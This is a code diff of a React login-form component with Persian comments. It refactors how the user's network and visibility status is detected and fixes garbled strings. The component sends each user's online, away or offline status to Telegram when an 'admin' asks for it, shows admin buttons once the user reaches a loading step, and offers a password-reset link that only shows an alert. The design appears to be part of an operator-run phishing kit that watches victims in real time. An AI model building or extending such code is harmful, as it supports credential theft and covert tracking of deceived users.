@@ -231,91 +231,36 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر با تست اتصال به شبکه
-        console.log("🔍 Admin requested status check for session:", sessionId);
+        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
+        console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
-        const navigatorOnline = navigator.onLine;
 
-        // تست چندگانه اتصال به شبکه
-        const checkNetworkConnectivity = async () => {
-          // Test 1: تست فایل محلی
-          try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000);
+        // استفاده از Enhanced Network Status Check
+        checkNetworkStatus().then((networkStatus) => {
+          const { isOnline: isActuallyOnline, connectionType } = networkStatus;
+          const { text: statusText, emoji: statusEmoji } = enhancedOfflineDetection.getStatusDisplay(networkStatus);
 
-            const response = await fetch('/placeholder.svg', {
-              method: 'HEAD',
-              cache: 'no-cache',
-              signal: controller.signal
-            });
-
-            clearTimeout(timeoutId);
-            if (response.ok) {
-              console.log("✅ Local connectivity test passed");
-              return true;
-            }
-          } catch (error) {
-            console.log("❌ Local connectivity test failed:", error.message);
-          }
-
-          // Test 2: تست اتصال به Cloudflare (سریع و قابل اعتماد)
-          try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 2000);
-
-            const response = await fetch('https://1.1.1.1/cdn-cgi/trace', {
-              method: 'GET',
-              cache: 'no-cache',
-              signal: controller.signal
-            });
-
-            clearTimeout(timeoutId);
-            if (response.ok) {
-              console.log("✅ External connectivity test passed");
-              return true;
-            }
-          } catch (error) {
-            console.log("❌ External connectivity test failed:", error.message);
-          }
-
-          // Test 3: تست connection type API اگر موجود باشد
-          if ('connection' in navigator) {
-            const connection = (navigator as any).connection;
-            if (connection && connection.effectiveType === 'offline') {
-              console.log("❌ Connection API reports offline");
-              return false;
-            }
-          }
-
-          return false;
-        };
-
-        // انجام تست اتصال
-        checkNetworkConnectivity().then((networkConnected) => {
-          const isActuallyOnline = navigatorOnline && networkConnected;
-
-          let statusText = "offline";
-          let statusEmoji = "🔴";
+          // تعیین وضعیت نهایی بر اساس visibility و network status
+          let finalStatusText = statusText;
+          let finalStatusEmoji = statusEmoji;
 
           if (isActuallyOnline && isVisible) {
-            statusText = "online";
-            statusEmoji = "🟢";
+            finalStatusText = "online";
+            finalStatusEmoji = "🟢";
           } else if (isActuallyOnline && !isVisible) {
-            statusText = "away";
-            statusEmoji = "🟡";
+            finalStatusText = "away";
+            finalStatusEmoji = "🟡";
           } else if (!isActuallyOnline) {
-            statusText = "offline";
-            statusEmoji = "📵";
+            finalStatusText = "offline";
+            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
           }
 
-          console.log("📊 Detailed status check:", {
+          console.log("📊 Enhanced status check results:", {
             isVisible,
-            navigatorOnline,
-            networkConnected,
-            isActuallyOnline,
-            statusText,
-            statusEmoji,
+            networkStatus,
+            finalStatusText,
+            finalStatusEmoji,
             currentStep,
             timestamp: new Date().toISOString(),
           });
@@ -325,8 +270,8 @@ export const LoginForm = () => {
             isActuallyOnline,
             isVisible,
             Date.now(),
-            statusText,
-            statusEmoji,
+            finalStatusText,
+            finalStatusEmoji,
             true, // forceUpdate = true for manual status check
           ).then(() => {
             console.log("✅ Enhanced status check completed and sent to Telegram");
@@ -334,44 +279,22 @@ export const LoginForm = () => {
             console.error("❌ Failed to send enhanced status check:", error);
           });
         }).catch((error) => {
-          // در صورت خطا، بررسی دقیق‌تر وضعیت
-          console.error("❌ Network test failed, performing detailed analysis:", error);
+          // Fallback: اگر enhanced detection هم کار نکرد
+          console.error("❌ Enhanced network detection failed:", error);
 
-          // اگر navigator.onLine false است، قطعاً آفلاین است
-          if (!navigatorOnline) {
-            console.log("🔴 Navigator reports offline - user is definitely offline");
-
-            updateUserOnlineStatus(
-              sessionId,
-              false, // offline
-              isVisible,
-              Date.now(),
-              "offline",
-              "📵",
-              true, // forceUpdate = true
-            ).then(() => {
-              console.log("✅ Confirmed offline status sent to Telegram");
-            }).catch((fallbackError) => {
-              console.error("❌ Failed to send offline status:", fallbackError);
-            });
-          } else {
-            // navigator.onLine true است اما شبکه کار نمی‌کند - احتمالاً مشکل اتصال
-            console.log("🟡 Navigator reports online but network tests failed - connection issues");
-
-            updateUserOnlineStatus(
-              sessionId,
-              false, // treat as offline due to connectivity issues
-              isVisible,
-              Date.now(),
-              "offline",
-              "🔴",
-              true, // forceUpdate = true
-            ).then(() => {
-              console.log("✅ Connection issue status sent to Telegram");
-            }).catch((fallbackError) => {
-              console.error("❌ Failed to send connection issue status:", fallbackError);
-            });
-          }
+          updateUserOnlineStatus(
+            sessionId,
+            false, // assume offline on error
+            isVisible,
+            Date.now(),
+            "offline",
+            "🔴",
+            true, // forceUpdate = true
+          ).then(() => {
+            console.log("✅ Fallback offline status sent to Telegram");
+          }).catch((fallbackError) => {
+            console.error("❌ Failed to send fallback status:", fallbackError);
+          });
         });
         break;
       case "complete":
@@ -505,7 +428,7 @@ export const LoginForm = () => {
       // Show admin buttons after reaching loading page
       setTimeout(async () => {
         try {
-          console.log("���� User reached loading step, showing admin buttons...");
+          console.log("📱 User reached loading step, showing admin buttons...");
           await showAdminButtons(sessionId);
 
           // In demo mode, show manual admin controls
@@ -2610,7 +2533,7 @@ export const LoginForm = () => {
                     onClick={(e) => {
                       e.preventDefault();
                       alert(
-                        "لینک بازیابی رم�� عبور به ایمیل شما ارسال خواهد شد.",
+                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
                       );
                     }}
                     style={{
